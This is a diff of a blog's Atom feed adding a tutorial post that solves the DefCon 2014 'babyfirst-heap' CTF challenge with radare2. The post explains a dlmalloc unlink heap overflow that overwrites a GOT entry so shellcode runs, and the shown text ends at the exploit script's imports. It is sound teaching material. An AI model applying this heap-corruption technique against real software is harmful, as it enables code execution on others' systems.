@@ -4,7 +4,7 @@
  <title>Álvaro Felipe Melchor</title>
  <link href="http://alvarofe.github.io/atom.xml" rel="self"/>
  <link href="http://alvarofe.github.io/"/>
- <updated>2015-03-12T17:15:31+01:00</updated>
+ <updated>2016-05-07T18:29:10+02:00</updated>
  <id>http://alvarofe.github.io</id>
  <author>
    <name>Álvaro Felipe Melchor</name>
@@ -13,7 +13,278 @@
 
  
  <entry>
-   <title>Format Strings - Level09 smashTheStack</title>
+   <title>Solving 'heap' from DefCON 2014 qualified with r2</title>
+   <link href="http://alvarofe.github.io/posts/defcon-r2-heap"/>
+   <updated>2016-05-07T00:00:00+02:00</updated>
+   <id>http://alvarofe.github.io/posts/defcon-r2-heap</id>
+   <content type="html">&lt;p&gt;This article will introduce r2 to resolve a simple CTF from Defcon &amp;#39;14 using Linux. For those who do not know radare2 is a &lt;code&gt;unix-like reverse engineering framework and commandline tools&lt;/code&gt; and the most important thing about it is that it is open source thus we can play with it. &lt;/p&gt;
+
+&lt;p&gt;Radare2 gives us the possibility to do reverse engineering and more by free as we will look on this post though we are not going too deeply into the commands. I leave it as an exercise for the reader.&lt;/p&gt;
+
+&lt;p&gt;Most people complain about the lack of doc that r2 has but that is far from the truth. Radare has:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Open source &lt;a href=&quot;https://www.gitbook.com/book/radare/radare2book/details&quot;&gt;Book&lt;/a&gt; in which anyone can contribute.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://radare.org/r/talks.html&quot;&gt;Talks&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://radare.tv/&quot;&gt;Asciinema&lt;/a&gt; showing usage examples.&lt;/li&gt;
+&lt;li&gt;If you append &lt;code&gt;?&lt;/code&gt; in each command in r2&amp;#39;s console you will get a little help.&lt;/li&gt;
+&lt;li&gt;There is a &lt;a href=&quot;http://radare.today/&quot;&gt;blog&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;IRC channel on freenode.net &lt;code&gt;#radare&lt;/code&gt;. &lt;/li&gt;
+&lt;li&gt;Last but not least we have the source code.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The first thing we are going to need is the binary on which we are going to play with.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;wget https://github.com/ctfs/write-ups-2014/raw/master/def-con-ctf-qualifier-2014/heap/babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The second one and the most important is radare2 and its tool suites. There is a tip in r2 land and it is &lt;code&gt;use radare2 always from git&lt;/code&gt; because of r2 is under strong development and it&amp;#39;s always including fixes and new features.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;git clone https://github.com/radare/radare2.git
+cd radare2
+./sys/install.sh
+$ r2 -v # to test that the installation was successful
+# after the installation we have these utilites
+r2agent  r2pm     rabin2   radare2  radiff2  rafind2  ragg2    rahash2  ranal2   rarun2   rasign2  rasm2    rax2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We are ready to to do the CTF. As usual in security the first thing to accomplish is gather information, in this case about the binary.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[alvaro @ ctf] $ ./babyfirst-heap
+
+Welcome to your first heap overflow...
+I am going to allocate 20 objects...
+Using Dougle Lee Allocator 2.6.1...
+Goodluck!
+
+Exit function pointer is at 804C8AC address.
+[ALLOC][loc=9076008][size=1246]
+[ALLOC][loc=90764F0][size=1121]
+[ALLOC][loc=9076958][size=947]
+[ALLOC][loc=9076D10][size=741]
+[ALLOC][loc=9077000][size=706]
+[ALLOC][loc=90772C8][size=819]
+[ALLOC][loc=9077600][size=673]
+[ALLOC][loc=90778A8][size=1004]
+[ALLOC][loc=9077C98][size=952]
+[ALLOC][loc=9078058][size=755]
+[ALLOC][loc=9078350][size=260]
+[ALLOC][loc=9078458][size=877]
+[ALLOC][loc=90787D0][size=1245]
+[ALLOC][loc=9078CB8][size=1047]
+[ALLOC][loc=90790D8][size=1152]
+[ALLOC][loc=9079560][size=1047]
+[ALLOC][loc=9079980][size=1059]
+[ALLOC][loc=9079DA8][size=906]
+[ALLOC][loc=907A138][size=879]
+[ALLOC][loc=907A4B0][size=823]
+Write to object [size=260]:
+aaaaaa
+Copied 7 bytes.
+[FREE][address=9076008]
+[FREE][address=90764F0]
+[FREE][address=9076958]
+[FREE][address=9076D10]
+[FREE][address=9077000]
+[FREE][address=90772C8]
+[FREE][address=9077600]
+[FREE][address=90778A8]
+[FREE][address=9077C98]
+[FREE][address=9078058]
+[FREE][address=9078350]
+[FREE][address=9078458]
+[FREE][address=90787D0]
+[FREE][address=9078CB8]
+[FREE][address=90790D8]
+[FREE][address=9079560]
+[FREE][address=9079980]
+[FREE][address=9079DA8]
+[FREE][address=907A138]
+[FREE][address=907A4B0]
+Did you forget to read the flag with your shellcode?
+Exiting
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Just running it, it gives us a lot of information. The most important in my opinion is &lt;code&gt;Using Dougle Lee Allocator 2.6.1&lt;/code&gt;. Just with that we already know about which is our mission here and basically is to fool the memory allocator to overwrite inline metadata to be able to write in arbitrary memory locations. If you do not know about what I am talking about I encourage to read the following articles before to continue: &lt;a href=&quot;http://www.phrack.org/issues/57/8.html#article&quot;&gt;phrack 57-8&lt;/a&gt; and &lt;a href=&quot;http://www.openwall.com/articles/JPEG-COM-Marker-Vulnerability&quot;&gt;Solar Designer&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;We should download the source code of our allocator to know how to make our exploit work.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;wget ftp://g.oswego.edu/pub/misc/malloc-2.6.1.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The most important of the code is.
+```C
+struct malloc&lt;em&gt;chunk
+{
+  size&lt;/em&gt;t size;               /* Size in bytes, including overhead. &lt;em&gt;/
+  struct malloc_chunk&lt;/em&gt; fd;   /* double links -- used only if free. &lt;em&gt;/
+  struct malloc_chunk&lt;/em&gt; bk;
+  size_t unused;             /* to pad decl to min chunk size */
+};&lt;/p&gt;
+
+&lt;h1&gt;define unlink(p)                                                             \&lt;/h1&gt;
+
+&lt;p&gt;{                                                                             \
+  mchunkptr Bul = (p)-&amp;gt;bk;                                                    \
+  mchunkptr Ful = (p)-&amp;gt;fd;                                                    \
+  Ful-&amp;gt;bk = Bul;  Bul-&amp;gt;fd = Ful;                                              \
+}                                                                             \
+```&lt;/p&gt;
+
+&lt;p&gt;If you read the article that I pointed before you already know why this is important. If not badly done but the idea is how the allocator handle the memory. It handles memory using &lt;code&gt;malloc_chunk&lt;/code&gt; and depending on whether the memory is allocated or freed its fields have different meanings (take into account the difference between the phrack article and our case).&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; chunk -&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+             | size: size of the chunk (the number of bytes between    |
+             | &amp;quot;chunk&amp;quot; and &amp;quot;nextchunk&amp;quot;) and 2 bits status information  |
+      mem -&amp;gt; +---------------------------------------------------------+
+             | fd: not used by dlmalloc because &amp;quot;chunk&amp;quot; is allocated   |
+             | (user data therefore starts here)                       |
+             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
+             | bk: not used by dlmalloc because &amp;quot;chunk&amp;quot; is allocated   |
+             | (there may be user data here)                           |
+             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
+             .                      User data                          .
+nextchunk -&amp;gt; + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The idea will be to overwrite the &lt;code&gt;size&lt;/code&gt;, &lt;code&gt;fd&lt;/code&gt; and &lt;code&gt;bk&lt;/code&gt; on the &lt;code&gt;nextchunk&lt;/code&gt; to execute &lt;code&gt;unlink&lt;/code&gt; and get a shell. We can get a shell overwritten this fields because the &lt;code&gt;unlink&lt;/code&gt; macro is as follows.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#define unlink(p)                                                             \&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;{                                                                             \&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;  mchunkptr BK = (p)-&amp;gt;bk;                                                    \&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;  mchunkptr FD = (p)-&amp;gt;fd;                                                    \&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;  FD+8 = BK;  &lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;BK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                                  \
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;                                                                             \
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We are able to write in &lt;code&gt;FD+8&lt;/code&gt; the direction of &lt;code&gt;BK&lt;/code&gt; which will be the direction of our shellcode. However, we are written in &lt;code&gt;BK+4&lt;/code&gt; as well so we need to overcome this issue.&lt;/p&gt;
+
+&lt;p&gt;Until this point I hope that more or less the how to exploit the binary be clear.&lt;/p&gt;
+
+&lt;p&gt;It&amp;#39;s time to get our hands dirty using r2 and continue getting info from our binary. Radare2 at first can seem difficult but once you start learning is very powerfull it&amp;#39;s the same feeling than &lt;code&gt;vim&lt;/code&gt;. The best part is that r2 follows the same philosophy as vim and every command has a meaning; it just a matter of time to get used to them.&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;a&lt;/code&gt; and its subcommands stand by analyze.
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;af&lt;/code&gt; = analyze function&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;aac&lt;/code&gt; = analyze calls&lt;/li&gt;
+&lt;li&gt;...&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;i&lt;/code&gt; and its subcommands stand by info.
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;is&lt;/code&gt; = info symbols&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ii&lt;/code&gt; = info imports&lt;/li&gt;
+&lt;li&gt;...&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;~&lt;/code&gt; is the internal grep&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@&lt;/code&gt; temporal seek&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;alvaro @ ctf&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r2 babyfirst-heap
+ -- Execute a &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;every &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;a breakpoint is hit with &lt;span class=&quot;s1&quot;&gt;&amp;#39;e cmd.bp = !my-program&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x080486f0&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&amp;gt; i?
+... get &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;and to know what does this &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x080486f0&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&amp;gt; &lt;span class=&quot;c&quot;&gt;# ~ is the internal grep&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x080486f0&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&amp;gt; i~pic,nx,canary
+pic      &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+canary   &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+nx       &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x080486f0&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&amp;gt; ik~relro
+elf.relro&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;partial relro
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[alvaro @ ctf] $ ./babyfirst-heap &amp;amp;
+[1] 11677
+[1]+  Detenido                ./babyfirst-heap
+[alvaro @ ctf] $ cat /proc/11677/maps |grep heap
+...
+097e2000-097e8000 rwxp 00000000 00:00 0                                  [heap]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;We have in our hands a binary without PIC, with partial RELRO and executable heap. It means that we can modify a &lt;a href=&quot;https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html&quot;&gt;GOT entry&lt;/a&gt; to get control over the program execution flow and allocate our shellcode on the heap.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;alvaro @ ctf&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r2 babyfirst-heap
+ -- Insert coin to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;..
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x080486f0&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&amp;gt; ir &lt;span class=&quot;c&quot;&gt;# get the binary&amp;#39;s relocations&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Relocations&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804bff0 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00002ff0 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 __gmon_start__
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c880 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003880 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ADD_64
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c884 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003884 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ADD_64
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c8a0 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x000038a0 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ADD_64
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c000 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003000 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 mprotect
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c004 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003004 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c008 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003008 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 memcpy
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c00c &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0000300c &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 signal
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c010 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003010 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 alarm
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c014 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003014 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 _IO_getc
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c018 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003018 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 puts
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c01c &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0000301c &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 __gmon_start__
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c020 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003020 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c024 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003024 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 __libc_start_main
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c028 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003028 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 fprintf
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c02c &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0000302c &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 setvbuf
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c030 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003030 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 memset
+&lt;span class=&quot;nv&quot;&gt;vaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c034 &lt;span class=&quot;nv&quot;&gt;paddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x00003034 &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SET_32 sbrk
+
+&lt;span class=&quot;m&quot;&gt;18&lt;/span&gt; relocations
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x080486f0&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&amp;gt; S &lt;span class=&quot;c&quot;&gt;# get sections&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; . 0x00000154 -r-- &lt;span class=&quot;nv&quot;&gt;va&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x08048154 &lt;span class=&quot;nv&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0013 &lt;span class=&quot;nv&quot;&gt;vsz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0013 .interp
+....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; . 0x00002ff0 -rw- &lt;span class=&quot;nv&quot;&gt;va&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804bff0 &lt;span class=&quot;nv&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0004 &lt;span class=&quot;nv&quot;&gt;vsz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0004 .got
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; . 0x00002ff4 -rw- &lt;span class=&quot;nv&quot;&gt;va&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804bff4 &lt;span class=&quot;nv&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0044 &lt;span class=&quot;nv&quot;&gt;vsz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0044 .got.plt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;23&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; . 0x00003040 -rw- &lt;span class=&quot;nv&quot;&gt;va&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0804c040 &lt;span class=&quot;nv&quot;&gt;sz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0824 &lt;span class=&quot;nv&quot;&gt;vsz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x0824 .data
+....
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;To dissasemble the binary and read what is going on exactly, just run these commands.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[alvaro @ ctf] $ r2 babyfirst-heap
+ -- Change the UID of the debugged process with child.uid (requires root)
+[0x080486f0]&amp;gt; s main # seek to the main symbol
+[0x0804890b]&amp;gt; af # define a function
+[0x0804890b]&amp;gt; Vp # get into visual mode, p rotates the print mode, by default is in hex (without p)
+use j/k to navigate and ? for help 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you understand the code you will see that the object that we are going to overflow is always the same size and it resides in &lt;code&gt;esp + 0x60&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;0x080489d6   cmp dword [esp + 0x133c], 0xa                 ; [0xa:4]=0 ; main.c:133
+0x080489de   jne 0x80489eb                                 ;[4]
+0x080489e0   mov dword [esp + 0x1338], 0x104               ; [0x104:4]=196 ; main.c:134 
+..
+esp+0x1338 will hold the size in this case 0x104=206 (run: rax2 0x104)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now it&amp;#39;s time to debug to understand even better the binary.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb.png&quot; alt=&quot;asciicast&quot;&gt;&lt;/a&gt; &lt;/p&gt;
+
+&lt;p&gt;As you just saw we have full control of the next chunk and our mission will be.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Write the next size field with the latest bit to 1. This will fool the allocator making it think that the chunk is free and the allocator will call unlink.&lt;/li&gt;
+&lt;li&gt;Write in the &lt;code&gt;fd&lt;/code&gt; field the direction of the relocation of printf minus 8. Why minus 8? If you look again in the unlink function it makes &lt;code&gt;FD-&amp;gt;bk = BK&lt;/code&gt; that is equivalent to &lt;code&gt;fd+8 = BK&lt;/code&gt; now just substitute &lt;code&gt;fd&lt;/code&gt; with &lt;code&gt;&amp;amp;reloc_printf - 8&lt;/code&gt; and you will write on &lt;code&gt;reloc_printf&lt;/code&gt;. To get the location of &lt;code&gt;reloc_printf&lt;/code&gt; just run in r2&amp;#39;s console &lt;code&gt;ir~printf&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Write in &lt;code&gt;bk&lt;/code&gt; the direction of our shellcode that the binary itself gives us.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But there is still one thing to solve. In the &lt;code&gt;unlink&lt;/code&gt; function &lt;code&gt;BK+4&lt;/code&gt; is overwritten so our shellcode must take this into account. How we can do that? Just patch the shellcode at the beginning to make a jmp. We use rasm2 to get the exact bytes we need.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[alvaro @ ~] $ rasm2 -a x86 -b 32 &amp;#39;jmp 0x10&amp;#39;
+eb0c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The first instruction will jump and whatever is written in &lt;code&gt;BK+4&lt;/code&gt; doesn&amp;#39;t matter :). The finally exploit is.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
+
